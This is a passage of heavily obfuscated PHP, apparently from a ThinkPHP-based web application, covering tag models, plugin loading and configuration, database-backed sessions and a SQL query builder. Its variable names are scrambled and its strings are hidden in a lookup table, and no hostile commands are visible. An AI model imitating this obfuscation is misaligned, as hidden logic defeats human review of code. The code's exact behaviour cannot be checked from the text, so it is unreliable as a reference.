$ğÔÏš©); } return $·Æˆ¦Œš; } protected function listData($—‹ï×¨±) { $šşû‰È– =& $_SERVER[ĞÂ¤àÓï]; $ÀàˆÔ¢ = array($šşû‰È–[1655] => 0, $šşû‰È–[484] => array($šşû‰È–[1969], 0), $šşû‰È–[422] => $šşû‰È–[1970] . $—‹ï×¨±); $Õî¦£í‰ = $šşû‰È–[1971]; $Ğ°ÌÊÊ = $this->field($Õî¦£í‰)->where($ÀàˆÔ¢)->order($šşû‰È–[1972])->select(); return $Ğ°ÌÊÊ ? $Ğ°ÌÊÊ : array(); } protected function addToTag($µæ¶š¨Ì, $¦Å–­‹², $ƒƒÊ¯ğú) { $±É«÷ì† =& $_SERVER[ĞÂ¤àÓï]; if (!$this->getByTagID($µæ¶š¨Ì, $ƒƒÊ¯ğú) || !$¦Å–­‹²) { return !1; } if (!Model($±É«÷ì†[832])->pathInfo($¦Å–­‹²)) { return !1; } $ä‹‹×¡ù = array($±É«÷ì†[1655] => 0, $±É«÷ì†[484] => $ƒƒÊ¯ğú, $±É«÷ì†[421] => $¦Å–­‹², $±É«÷ì†[422] => $±É«÷ì†[1973] . $µæ¶š¨Ì, $±É«÷ì†[420] => $±É«÷ì†[12], $±É«÷ì†[1858] => 0); if ($this->where($ä‹‹×¡ù)->find()) { return !1; } return $this->add($ä‹‹×¡ù); } protected function removeFromTag($„Å§ú€œ, $ûœî‡óÕ, $ˆ‡ş‚ôè) { $¨£×—İ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->getByTagID($„Å§ú€œ, $ˆ‡ş‚ôè) || !$ûœî‡óÕ) { return !1; } if (is_array($ûœî‡óÕ)) { $ûœî‡óÕ = array($¨£×—İ[7], $ûœî‡óÕ); } $Å¸†÷¯Â = array($¨£×—İ[1655] => 0, $¨£×—İ[484] => $ˆ‡ş‚ôè, $¨£×—İ[422] => $¨£×—İ[1973] . $„Å§ú€œ, $¨£×—İ[421] => $ûœî‡óÕ); return $this->where($Å¸†÷¯Â)->delete(); } protected function removeByTag($ßÒ…Ãí…, $ıÆ¦õ) { $¡ÆÁ¥ì§ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->getByTagID($ßÒ…Ãí…, $ıÆ¦õ)) { return !1; } $şäÀñÆÃ = array($¡ÆÁ¥ì§[1655] => 0, $¡ÆÁ¥ì§[484] => $ıÆ¦õ, $¡ÆÁ¥ì§[422] => $¡ÆÁ¥ì§[1973] . $ßÒ…Ãí…); return $this->where($şäÀñÆÃ)->delete(); } protected function removeBySource($Í–æÇŒê, $âŠÂ¾) { $§£¦÷ =& $_SERVER[ĞÂ¤àÓï]; if (!$Í–æÇŒê || !$âŠÂ¾) { return !1; } if (is_array($âŠÂ¾)) { $âŠÂ¾ = array($§£¦÷[7], $âŠÂ¾); } $µ¨Ó¸Êã = array($§£¦÷[1655] => 0, $§£¦÷[421] => $âŠÂ¾, $§£¦÷[484] => array($§£¦÷[1014], 0), $§£¦÷[422] => $§£¦÷[1973] . $Í–æÇŒê); return $this->where($µ¨Ó¸Êã)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x70\x6c\165\147\x69\156\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\x73\x74\x61\164\165\163", "\162\145\x67\151\145\x73\x74", "\143\157\x6e\146\151\147"); public function loadList($«ú©ÜŒ® = false) { $ë‹«ı‰ß = array_to_keyvalue($this->listData(), $_SERVER[ĞÂ¤àÓï][32]); if ($«ú©ÜŒ®) { return $ë‹«ı‰ß[$«ú©ÜŒ®]; } return $ë‹«ı‰ß; } public function init() { $ƒãÍ„Ü° =& $_SERVER[ĞÂ¤àÓï]; Hook::trigger($ƒãÍ„Ü°[1974]); $¢¥Òøè = $this->loadPluginList(); foreach ($¢¥Òøè as $µãÑ «÷ => $ØÖº¯¼) { $¶Õ¢Ü¼â = $this->appAllow($µãÑ «÷, $ØÖº¯¼); if (!$¶Õ¢Ü¼â) { continue; } foreach ($ØÖº¯¼[$ƒãÍ„Ü°[1975]] as $Åùæ’ı¹ => $Ÿ…Òìá) { Hook::bind($Åùæ’ı¹, $Ÿ…Òìá); } } Hook::trigger($ƒãÍ„Ü°[1976]); Hook::trigger(ACTION); } public function appAllow($Œ­”İê”, $‡Î›Œæö, $ø†’ìƒá = true) { $¿æÒü€µ =& $_SERVER[ĞÂ¤àÓï]; $¦¥ÙûßÍ = PLUGIN_DIR . $Œ­”İê” . $¿æÒü€µ[1977]; if (!is_array($‡Î›Œæö) || !is_array($‡Î›Œæö[$¿æÒü€µ[1975]]) || $‡Î›Œæö[$¿æÒü€µ[749]] != 1 || !is_file($¦¥ÙûßÍ)) { return !1; } if ($GLOBALS[$¿æÒü€µ[503]] == 1) { if ($GLOBALS[$¿æÒü€µ[6]][$¿æÒü€µ[1978]] || !$GLOBALS[$¿æÒü€µ[6]][$¿æÒü€µ[1979]]) { return !0; } $ïø·Îôø = explode($¿æÒü€µ[50], strtolower($GLOBALS[$¿æÒü€µ[6]][$¿æÒü€µ[1979]])); return in_array(strtolower($Œ­”İê”), $ïø·Îôø) ? !1 : !0; } if ($ø†’ìƒá && !Action($¿æÒü€µ[1980])->checkAuth($Œ­”İê”)) { return !1; } return !0; } public function unInstall($…èÔ–) { $±ë±¥Êæ =& $_SERVER[ĞÂ¤àÓï]; $ûÄ•Ç˜ = $this->loadList($…èÔ–); if (file_exists(PLUGIN_DIR . $…èÔ–)) { Hook::apply($…èÔ– . $±ë±¥Êæ[1981]); } $this->remove($ûÄ•Ç˜[$±ë±¥Êæ[399]]); } public function changeStatus($Ÿ·™ó²Ë, $µ½’‚£·) { $´Ğ°†è¢ =& $_SERVER[ĞÂ¤àÓï]; $¥„ê¬Å = $this->loadList($Ÿ·™ó²Ë); if ($µ½’‚£·) { Hook::apply($Ÿ·™ó²Ë . $´Ğ°†è¢[1982]); } $this->update($¥„ê¬Å[$´Ğ°†è¢[399]], array($´Ğ°†è¢[1983] => $µ½’‚£·)); } public function appRegist($°¼å–Ú, $¼««úª÷) { $¦êÇèÇí =& $_SERVER[ĞÂ¤àÓï]; $âÌ‡ÛÅÜ = $this->loadList($°¼å–Ú); if ($âÌ‡ÛÅÜ) { $this->update($âÌ‡ÛÅÜ[$¦êÇèÇí[399]], array($¦êÇèÇí[1975] => $¼««úª÷)); } else { $ŒÅ“®ù³ = array($¦êÇèÇí[32] => $°¼å–Ú, $¦êÇèÇí[1975] => $¼««úª÷, $¦êÇèÇí[749] => 0, $¦êÇèÇí[6] => $this->getConfigDefault($°¼å–Ú)); $this->insert($ŒÅ“®ù³); } } public function getConfigDefault($î‘¬¨Æ) { $ùû÷ø =& $_SERVER[ĞÂ¤àÓï]; $âô÷»‡® = array(); $¨«ŞÏŞ¹ = $this->getPackageJson($î‘¬¨Æ); if (!$¨«ŞÏŞ¹ && is_array($¨«ŞÏŞ¹[$ùû÷ø[1984]])) { return $âô÷»‡®; } foreach ($¨«ŞÏŞ¹[$ùû÷ø[1984]] as $ô§ö¬¸ => $Í÷áãğ½) { if (!isset($Í÷áãğ½[$ùû÷ø[374]]) || isset($âô÷»‡®[$ô§ö¬¸])) { continue; } $âô÷»‡®[$ô§ö¬¸] = $Í÷áãğ½[$ùû÷ø[374]]; } return $âô÷»‡®; } public function getPackageJson($ºÅìÅ½’) { return Hook::apply($ºÅìÅ½’ . $_SERVER[ĞÂ¤àÓï][1985]); } public function getConfig($õ®üÎñÍ, $ö©ºíÕœ = false) { $˜ìŒâå =& $_SERVER[ĞÂ¤àÓï]; $üÙ­şô« = array(); $¡†³İÚ = $this->loadList($õ®üÎñÍ); if ($¡†³İÚ && is_array($¡†³İÚ[$˜ìŒâå[6]])) { $üÙ­şô« = $¡†³İÚ[$˜ìŒâå[6]]; } if (!$üÙ­şô« || $ö©ºíÕœ) { $üÙ­şô« = $this->getConfigDefault($õ®üÎñÍ); } return $üÙ­şô«; } public function setConfig($ÏÂöÙ«¯, $ô©…¢æİ = false) { $¶Ë‡´ºÌ =& $_SERVER[ĞÂ¤àÓï]; $ü Ë—² = $this->loadList($ÏÂöÙ«¯); if (!$ü Ë—²) { return !1; } $šÕñ¡İÅ = $ü Ë—²[$¶Ë‡´ºÌ[6]]; if ($ô©…¢æİ == !1) { $šÕñ¡İÅ = array(); $ô©…¢æİ = $this->getConfigDefault($ÏÂöÙ«¯); } foreach ($ô©…¢æİ as $Ü½ÖŒÂà => $ØŞàßÔÓ) { $šÕñ¡İÅ[$Ü½ÖŒÂà] = is_string($ØŞàßÔÓ) ? trim($ØŞàßÔÓ) : $ØŞàßÔÓ; } $this->update($ü Ë—²[$¶Ë‡´ºÌ[399]], array($¶Ë‡´ºÌ[6] => $šÕñ¡İÅ)); } public function viewList() { $·³£ ˆî =& $_SERVER[ĞÂ¤àÓï]; $œÃø–õ­ = $this->loadList(); $this->pluginScan($œÃø–õ­); $œÃø–õ­ = $this->loadPluginList(); $‹¢ë = array(); foreach ($œÃø–õ­ as $¨Ïóä§£ => $¼ò°¡û÷) { unset($¼ò°¡û÷[$·³£ ˆî[1975]], $¼ò°¡û÷[$·³£ ˆî[6]]); $ıà®‚øá = PLUGIN_DIR . $¼ò°¡û÷[$·³£ ˆî[32]] . $·³£ ˆî[1977]; if (!is_file($ıà®‚øá)) { continue; } $‡³ãÏí = Hook::apply($¼ò°¡û÷[$·³£ ˆî[32]] . $·³£ ˆî[1985]); if (is_array($‡³ãÏí)) { $‹¢ë[$¨Ïóä§£] = array_merge($¼ò°¡û÷, $‡³ãÏí); } } return $‹¢ë; } private function loadPluginList() { $¢¬µ…øÇ =& $_SERVER[ĞÂ¤àÓï]; $Ğ‹—ñ¨Ù = $this->loadList(); if (strtolower(MOD) == $¢¬µ…øÇ[1986]) { return $Ğ‹—ñ¨Ù; } $‘Ì¬ŸÚŸ = Hook::trigger($¢¬µ…øÇ[1987], $Ğ‹—ñ¨Ù); if ($Ğ‹—ñ¨Ù && !$‘Ì¬ŸÚŸ) { die; } return $‘Ì¬ŸÚŸ ? $‘Ì¬ŸÚŸ : $Ğ‹—ñ¨Ù; } private function pluginScan($í­ÑïÇ‘) { $ÙÜ¾ÓÚÎ =& $_SERVER[ĞÂ¤àÓï]; recursion_dir(PLUGIN_DIR, $‘çğàû‰, $´ÓÈï»ï, 0); foreach ($‘çğàû‰ as $²¥²ù¢Ã) { $¡šÔÃ€â = get_path_this($²¥²ù¢Ã); if (isset($í­ÑïÇ‘[$¡šÔÃ€â]) || !file_exists($²¥²ù¢Ã . $ÙÜ¾ÓÚÎ[1988]) || !file_exists($²¥²ù¢Ã . $ÙÜ¾ÓÚÎ[1977])) { continue; } Hook::apply($¡šÔÃ€â . $ÙÜ¾ÓÚÎ[1982]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\163\145\x73\163\151\157\x6e"; public function get($¹¯ÎŸÁ°) { $ê©èéÁ« =& $_SERVER[ĞÂ¤àÓï]; $öâ¡Ï“Ô = $this->where(array($ê©èéÁ«[1989] => $¹¯ÎŸÁ°))->find(); if (!is_array($öâ¡Ï“Ô)) { return !1; } return $öâ¡Ï“Ô[$ê©èéÁ«[754]]; } public function set($–˜ÛÏ³Ê, $ñ×§»‚è, $§¸Ç˜Ô™ = 3600) { $öÁÇîÖ½ =& $_SERVER[ĞÂ¤àÓï]; $·Œ„€ƒ« = array($öÁÇîÖ½[1989] => $–˜ÛÏ³Ê, $öÁÇîÖ½[1893] => $ñ×§»‚è, $öÁÇîÖ½[1990] => $§¸Ç˜Ô™ + time()); if (Session::get($öÁÇîÖ½[1991])) { $·Œ„€ƒ«[$öÁÇîÖ½[1664]] = Session::get($öÁÇîÖ½[1991]); } else { $·Œ„€ƒ«[$öÁÇîÖ½[1664]] = 0; } if ($this->get($–˜ÛÏ³Ê)) { return $this->where(array($öÁÇîÖ½[1989] => $–˜ÛÏ³Ê))->save($·Œ„€ƒ«); } else { return $this->add($·Œ„€ƒ«, array(), !0); } } public function remove($šİüÅ—Ç) { return $this->where(array($_SERVER[ĞÂ¤àÓï][1989] => $šİüÅ—Ç))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ĞÂ¤àÓï][1992] . time())->delete(); } } goto dœà‚Ñ›£°; B¦Ü¥—Š: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\x3c\x3e", "\147\x74" => "\76", "\x65\x67\164" => "\76\x3d", "\154\164" => "\74", "\x65\154\164" => "\74\75", "\x6e\x6f\x74\x6c\151\153\145" => "\116\x4f\124\40\114\x49\113\x45", "\x6c\x69\x6b\145" => "\114\111\x4b\x45", "\151\156" => "\x49\x4e", "\156\157\164\151\156" => "\x4e\x4f\x54\40\x49\x4e", "\x6e\x6f\164\40\151\x6e" => "\116\117\x54\x20\111\116", "\142\145\x74\167\x65\x65\156" => "\102\x45\124\127\x45\x45\x4e", "\156\157\164\x62\145\x74\167\145\x65\156" => "\x4e\x4f\x54\x20\102\x45\x54\127\x45\105\116", "\156\157\x74\40\x62\x65\164\167\x65\x65\156" => "\x4e\x4f\x54\40\x42\x45\x54\x57\105\x45\x4e"); protected $selectSql = "\123\105\114\105\x43\124\45\104\x49\x53\x54\x49\116\x43\124\45\40\45\106\x49\105\114\104\x25\40\x46\x52\117\115\40\45\x54\101\x42\x4c\x45\x25\x25\112\117\x49\116\x25\x25\x57\x48\105\x52\x45\45\x25\107\122\117\125\120\45\45\x48\x41\x56\x49\x4e\107\45\45\117\x52\x44\105\x52\x25\45\x4c\x49\115\111\x54\45\40\45\x55\x4e\x49\x4f\x4e\x25\x25\103\117\x4d\115\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $öÛ§Ïœ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ĞÂ¤àÓï][960], $öÛ§Ïœ); } public function factory($¾òéØıÔ = '') { $õßÖÁŸ¯ =& $_SERVER[ĞÂ¤àÓï]; $¾òéØıÔ = $this->parseConfig($¾òéØıÔ); if (empty($¾òéØıÔ[$õßÖÁŸ¯[961]])) { think_exception(think_lang($õßÖÁŸ¯[962])); } $this->dbType = ucwords(strtolower($¾òéØıÔ[$õßÖÁŸ¯[961]])); $Ñ§²Šª = $õßÖÁŸ¯[963] . $this->dbType; if (class_exists($Ñ§²Šª)) { $œšâ¸¥ = new $Ñ§²Šª($¾òéØıÔ); if ($õßÖÁŸ¯[964] != strtolower($¾òéØıÔ[$õßÖÁŸ¯[961]])) { $œšâ¸¥->dbType = strtoupper($this->dbType); } else { $œšâ¸¥->dbType = $this->_getDsnType($¾òéØıÔ[$õßÖÁŸ¯[916]]); } } else { think_exception(think_lang($õßÖÁŸ¯[965]) . $õßÖÁŸ¯[966] . $Ñ§²Šª); } return $œšâ¸¥; } public function __call($Œİ™êˆÄ, $İ˜ËıáÃ) { if (method_exists($this, $Œİ™êˆÄ)) { return call_user_func_array(array($this, $Œİ™êˆÄ), $İ˜ËıáÃ); } } protected function _getDsnType($òÅıÏ¬¥) { $¡´ûÊÒÍ = explode($_SERVER[ĞÂ¤àÓï][4], $òÅıÏ¬¥); $‰çœ÷É = strtoupper(trim($¡´ûÊÒÍ[0])); return $‰çœ÷É; } private function parseConfig($Î‡£òî– = '') { $ñô†®Æí =& $_SERVER[ĞÂ¤àÓï]; if (!empty($Î‡£òî–) && is_string($Î‡£òî–)) { $Î‡£òî– = $this->parseDSN($Î‡£òî–); } elseif (is_array($Î‡£òî–)) { $Î‡£òî– = array_change_key_case($Î‡£òî–); $Î‡£òî– = array($ñô†®Æí[961] => $Î‡£òî–[$ñô†®Æí[967]], $ñô†®Æí[888] => $Î‡£òî–[$ñô†®Æí[968]], $ñô†®Æí[889] => $Î‡£òî–[$ñô†®Æí[969]], $ñô†®Æí[886] => $Î‡£òî–[$ñô†®Æí[970]], $ñô†®Æí[887] => $Î‡£òî–[$ñô†®Æí[971]], $ñô†®Æí[21] => $Î‡£òî–[$ñô†®Æí[972]], $ñô†®Æí[916] => $Î‡£òî–[$ñô†®Æí[973]], $ñô†®Æí[17] => isset($Î‡£òî–[$ñô†®Æí[974]]) ? $Î‡£òî–[$ñô†®Æí[974]] : array()); } elseif (empty($Î‡£òî–)) { if (think_config($ñô†®Æí[975]) && $ñô†®Æí[964] != strtolower(think_config($ñô†®Æí[976]))) { $Î‡£òî– = $this->parseDSN(think_config($ñô†®Æí[975])); } else { $Î‡£òî– = array($ñô†®Æí[961] => think_config($ñô†®Æí[976]), $ñô†®Æí[888] => think_config($ñô†®Æí[977]), $ñô†®Æí[889] => think_config($ñô†®Æí[978]), $ñô†®Æí[886] => think_config($ñô†®Æí[979]), $ñô†®Æí[887] => think_config($ñô†®Æí[980]), $ñô†®Æí[21] => think_config($ñô†®Æí[246]), $ñô†®Æí[916] => think_config($ñô†®Æí[975]), $ñô†®Æí[17] => think_config($ñô†®Æí[981])); } } return $Î‡£òî–; } protected function initConnect($ó¥Í®ƒ” = true) { if (1 == think_config($_SERVER[ĞÂ¤àÓï][22])) { $this->_linkID = $this->multiConnect($ó¥Í®ƒ”); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÉãùÊÉÃ => $Éª²áŠğ) { $this->_linkID = $Éª²áŠğ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($«­“Äà® = false) { $ÜÙ¤ëß‡ =& $_SERVER[ĞÂ¤àÓï]; static $ÖÔ‹£İ = array(); static $ŠÑš”Î¤ = -1; if (empty($ÖÔ‹£İ)) { foreach ($this->config as $°Ç°àİŠ => $ûä³¿ô”) { $ÖÔ‹£İ[$°Ç°àİŠ] = explode($ÜÙ¤ëß‡[50], $ûä³¿ô”); } } if (think_config($ÜÙ¤ëß‡[982])) { if ($«­“Äà® || think_config($ÜÙ¤ëß‡[395]) === !0) { $âûÙ¤ºÅ = floor(mt_rand(0, think_config($ÜÙ¤ëß‡[983]) - 1)); $ŠÑš”Î¤ = $âûÙ¤ºÅ; } else { if (is_numeric(think_config($ÜÙ¤ëß‡[984]))) { $âûÙ¤ºÅ = think_config($ÜÙ¤ëß‡[984]); } else { $âûÙ¤ºÅ = floor(mt_rand(think_config($ÜÙ¤ëß‡[983]), count($ÖÔ‹£İ[$ÜÙ¤ëß‡[886]]) - 1)); } } } else { $âûÙ¤ºÅ = floor(mt_rand(0, count($ÖÔ‹£İ[$ÜÙ¤ëß‡[886]]) - 1)); $ŠÑš”Î¤ = $âûÙ¤ºÅ; } $âûÙ¤ºÅ = $ŠÑš”Î¤ !== -1 ? $ŠÑš”Î¤ : $âûÙ¤ºÅ; $ˆØóÄæ = array($ÜÙ¤ëß‡[888] => isset($ÖÔ‹£İ[$ÜÙ¤ëß‡[888]][$âûÙ¤ºÅ]) ? $ÖÔ‹£İ[$ÜÙ¤ëß‡[888]][$âûÙ¤ºÅ] : $ÖÔ‹£İ[$ÜÙ¤ëß‡[888]][0], $ÜÙ¤ëß‡[889] => isset($ÖÔ‹£İ[$ÜÙ¤ëß‡[889]][$âûÙ¤ºÅ]) ? $ÖÔ‹£İ[$ÜÙ¤ëß‡[889]][$âûÙ¤ºÅ] : $ÖÔ‹£İ[$ÜÙ¤ëß‡[889]][0], $ÜÙ¤ëß‡[886] => isset($ÖÔ‹£İ[$ÜÙ¤ëß‡[886]][$âûÙ¤ºÅ]) ? $ÖÔ‹£İ[$ÜÙ¤ëß‡[886]][$âûÙ¤ºÅ] : $ÖÔ‹£İ[$ÜÙ¤ëß‡[886]][0], $ÜÙ¤ëß‡[887] => isset($ÖÔ‹£İ[$ÜÙ¤ëß‡[887]][$âûÙ¤ºÅ]) ? $ÖÔ‹£İ[$ÜÙ¤ëß‡[887]][$âûÙ¤ºÅ] : $ÖÔ‹£İ[$ÜÙ¤ëß‡[887]][0], $ÜÙ¤ëß‡[21] => isset($ÖÔ‹£İ[$ÜÙ¤ëß‡[21]][$âûÙ¤ºÅ]) ? $ÖÔ‹£İ[$ÜÙ¤ëß‡[21]][$âûÙ¤ºÅ] : $ÖÔ‹£İ[$ÜÙ¤ëß‡[21]][0], $ÜÙ¤ëß‡[916] => isset($ÖÔ‹£İ[$ÜÙ¤ëß‡[916]][$âûÙ¤ºÅ]) ? $ÖÔ‹£İ[$ÜÙ¤ëß‡[916]][$âûÙ¤ºÅ] : $ÖÔ‹£İ[$ÜÙ¤ëß‡[916]][0], $ÜÙ¤ëß‡[17] => isset($ÖÔ‹£İ[$ÜÙ¤ëß‡[17]][$âûÙ¤ºÅ]) ? $ÖÔ‹£İ[$ÜÙ¤ëß‡[17]][$âûÙ¤ºÅ] : $ÖÔ‹£İ[$ÜÙ¤ëß‡[17]][0]); return $this->connect($ˆØóÄæ, $âûÙ¤ºÅ); } public function parseDSN($£õ°¯Û¦) { $çÓÉêÉè =& $_SERVER[ĞÂ¤àÓï]; if (empty($£õ°¯Û¦)) { return !1; } $Ú£œ©‡Ì = parse_url($£õ°¯Û¦); if ($Ú£œ©‡Ì[$çÓÉêÉè[180]]) { $Ã·§™‚– = array($çÓÉêÉè[961] => $Ú£œ©‡Ì[$çÓÉêÉè[180]], $çÓÉêÉè[888] => isset($Ú£œ©‡Ì[$çÓÉêÉè[600]]) ? $Ú£œ©‡Ì[$çÓÉêÉè[600]] : $çÓÉêÉè[12], $çÓÉêÉè[889] => isset($Ú£œ©‡Ì[$çÓÉêÉè[985]]) ? $Ú£œ©‡Ì[$çÓÉêÉè[985]] : $çÓÉêÉè[12], $çÓÉêÉè[886] => isset($Ú£œ©‡Ì[$çÓÉêÉè[181]]) ? $Ú£œ©‡Ì[$çÓÉêÉè[181]] : $çÓÉêÉè[12], $çÓÉêÉè[887] => isset($Ú£œ©‡Ì[$çÓÉêÉè[182]]) ? $Ú£œ©‡Ì[$çÓÉêÉè[182]] : $çÓÉêÉè[12], $çÓÉêÉè[21] => isset($Ú£œ©‡Ì[$çÓÉêÉè[84]]) ? substr($Ú£œ©‡Ì[$çÓÉêÉè[84]], 1) : $çÓÉêÉè[12]); } else { preg_match($çÓÉêÉè[986], trim($£õ°¯Û¦), $ÔÄ¬õƒ˜); $Ã·§™‚– = array($çÓÉêÉè[961] => $ÔÄ¬õƒ˜[1], $çÓÉêÉè[888] => $ÔÄ¬õƒ˜[2], $çÓÉêÉè[889] => $ÔÄ¬õƒ˜[3], $çÓÉêÉè[886] => $ÔÄ¬õƒ˜[4], $çÓÉêÉè[887] => $ÔÄ¬õƒ˜[5], $çÓÉêÉè[21] => $ÔÄ¬õƒ˜[6]); } $Ã·§™‚–[$çÓÉêÉè[916]] = $çÓÉêÉè[12]; return $Ã·§™‚–; } protected function debug() { $¬¡–òÌ¸ =& $_SERVER[ĞÂ¤àÓï]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¬¡–òÌ¸[987]; if (think_config($¬¡–òÌ¸[988])) { think_status($¬¡–òÌ¸[989]); think_trace($this->queryStr . $¬¡–òÌ¸[990] . think_status($¬¡–òÌ¸[24], $¬¡–òÌ¸[989], 6) . $¬¡–òÌ¸[991], $¬¡–òÌ¸[12], $¬¡–òÌ¸[992]); } } protected function parseLock($œ’ÊĞÒ = false) { $ØúïĞê =& $_SERVER[ĞÂ¤àÓï]; if (!$œ’ÊĞÒ) { return $ØúïĞê[12]; } if ($ØúïĞê[918] == $this->dbType) { return $ØúïĞê[993]; } return $ØúïĞê[994]; } protected function parseSet($ğù¯˜±Ò) { $Ò··õß =& $_SERVER[ĞÂ¤àÓï]; foreach ($ğù¯˜±Ò as $¿à­ÃÈÊ => $êâç³›) { if (is_array($êâç³›) && $Ò··õß[297] == $êâç³›[0]) { $÷‚„şˆ™[] = $this->parseKey($¿à­ÃÈÊ) . $Ò··õß[884] . $êâç³›[1]; } elseif (is_scalar($êâç³›) || is_null($êâç³›)) { $÷‚„şˆ™[] = $this->parseKey($¿à­ÃÈÊ) . $Ò··õß[884] . $this->parseValue($êâç³›); } } return $Ò··õß[995] . implode($Ò··õß[50], $÷‚„şˆ™); } protected function bindParam($ªç¦€Œ, $¬·Ö…») { $this->bind[$_SERVER[ĞÂ¤àÓï][4] . $ªç¦€Œ] = $¬·Ö…»; } protected function parseBind($ÀÆ¼Ü–) { $ÀÆ¼Ü– = array_merge($this->bind, $ÀÆ¼Ü–); $this->bind = array(); return $ÀÆ¼Ü–; } function parseKey(&$ÔÆ•åÇ€, $³•¥ÎÊ = true) { if ($³•¥ÎÊ) { $ÔÆ•åÇ€ = $this->parseKeyCheck($ÔÆ•åÇ€); } return $ÔÆ•åÇ€; } function parseKeyCheck($Š¯åø×“) { $ıö®ıÒ° =& $_SERVER[ĞÂ¤àÓï]; $Š¯åø×“ = trim($Š¯åø×“); if (!preg_match($ıö®ıÒ°[996], $Š¯åø×“)) { think_exception($ıö®ıÒ°[997] . $Š¯åø×“); } return $Š¯åø×“; } protected function parseValue($Ü—»¡Å) { $·Í±ŠÎ‚ =& $_SERVER[ĞÂ¤àÓï]; if (is_string($Ü—»¡Å)) { $Ü—»¡Å = $·Í±ŠÎ‚[957] . $this->escapeString($Ü—»¡Å) . $·Í±ŠÎ‚[957]; } elseif (isset($Ü—»¡Å[0]) && is_string($Ü—»¡Å[0]) && strtolower($Ü—»¡Å[0]) == $·Í±ŠÎ‚[297]) { $Ü—»¡Å = $this->escapeString($Ü—»¡Å[1]); } elseif (is_array($Ü—»¡Å)) { $Ü—»¡Å = array_map(array($this, $·Í±ŠÎ‚[958]), $Ü—»¡Å); } elseif (is_bool($Ü—»¡Å)) { $Ü—»¡Å = $Ü—»¡Å ? $·Í±ŠÎ‚[88] : $·Í±ŠÎ‚[197]; } elseif (is_null($Ü—»¡Å)) { $Ü—»¡Å = $·Í±ŠÎ‚[103]; } return $Ü—»¡Å; } protected function parseField($‹Í„ôÖã) { $øüÁõÊÁ =& $_SERVER[ĞÂ¤àÓï]; if (is_string($‹Í„ôÖã) && strpos($‹Í„ôÖã, $øüÁõÊÁ[50])) { $‹Í„ôÖã = explode($øüÁõÊÁ[50], $‹Í„ôÖã); } if (is_array($‹Í„ôÖã)) { $ËıÛ±‘ = array(); foreach ($‹Í„ôÖã as $è˜–£öı => $ÜÂÁË®‘) { if (!is_numeric($è˜–£öı)) { $ËıÛ±‘[] = $this->parseKey($è˜–£öı, !1) . $øüÁõÊÁ[998] . $this->parseKey($ÜÂÁË®‘); } else { $ËıÛ±‘[] = $this->parseKey($ÜÂÁË®‘); } } $Ğéæ’×® = implode($øüÁõÊÁ[50], $ËıÛ±‘); } elseif (is_string($‹Í„ôÖã) && !empty($‹Í„ôÖã)) { $Ğéæ’×® = $‹Í„ôÖã; } else { $Ğéæ’×® = $øüÁõÊÁ[188]; } return $Ğéæ’×®; } protected function parseTable($ùöšîÆ†) { $¦êÙ‰íÇ =& $_SERVER[ĞÂ¤àÓï]; if (is_array($ùöšîÆ†)) { $¹ÁĞ‚ŞË = array(); foreach ($ùöšîÆ† as $ıË•‹»” => $…Ó§­ÅĞ) { if (!is_numeric($ıË•‹»”)) { $¹ÁĞ‚ŞË[] = $this->parseKey($ıË•‹»”) . $¦êÙ‰íÇ[53] . $this->parseKey($…Ó§­ÅĞ); } else { $¹ÁĞ‚ŞË[] = $this->parseKey($ıË•‹»”); } } $ùöšîÆ† = $¹ÁĞ‚ŞË; } elseif (is_string($ùöšîÆ†)) { if (strstr($ùöšîÆ†, $¦êÙ‰íÇ[53])) { return $ùöšîÆ†; } $ùöšîÆ† = explode($¦êÙ‰íÇ[50], $ùöšîÆ†); array_walk($ùöšîÆ†, array($this, $¦êÙ‰íÇ[906])); } return $¦êÙ‰íÇ[900] . trim(implode($¦êÙ‰íÇ[999], $ùöšîÆ†), $¦êÙ‰íÇ[385]) . $¦êÙ‰íÇ[900]; } protected function parseWhere($Ëş¾€¤¤) { $ø ø“Ìß =& $_SERVER[ĞÂ¤àÓï]; $®´Ä¯‹ = $ø ø“Ìß[12]; if (is_string($Ëş¾€¤¤)) { $®´Ä¯‹ = $Ëş¾€¤¤; } else { $ªäíµö• = isset($Ëş¾€¤¤[$ø ø“Ìß[1000]]) ? strtoupper($Ëş¾€¤¤[$ø ø“Ìß[1000]]) : $ø ø“Ìß[12]; if (in_array($ªäíµö•, array($ø ø“Ìß[1001], $ø ø“Ìß[1002], $ø ø“Ìß[1003]))) { $ªäíµö• = $ø ø“Ìß[53] . $ªäíµö• . $ø ø“Ìß[53]; unset($Ëş¾€¤¤[$ø ø“Ìß[1000]]); } else { $ªäíµö• = $ø ø“Ìß[1004]; } foreach ($Ëş¾€¤¤ as $ûŸ€ü¥ => $³ğğ·»¨) { $®´Ä¯‹ .= $ø ø“Ìß[277]; if (is_numeric($ûŸ€ü¥)) { $ûŸ€ü¥ = $ø ø“Ìß[1005]; } if (0 === strpos($ûŸ€ü¥, $ø ø“Ìß[11])) { $®´Ä¯‹ .= $this->parseThinkWhere($ûŸ€ü¥, $³ğğ·»¨); } else { if (!preg_match($ø ø“Ìß[1006], trim($ûŸ€ü¥))) { think_exception(think_lang($ø ø“Ìß[1007]) . $ø ø“Ìß[4] . $ûŸ€ü¥); } $¸˜À‚í‘ = is_array($³ğğ·»¨) && isset($³ğğ·»¨[$ø ø“Ìß[1008]]); $ûŸ€ü¥ = 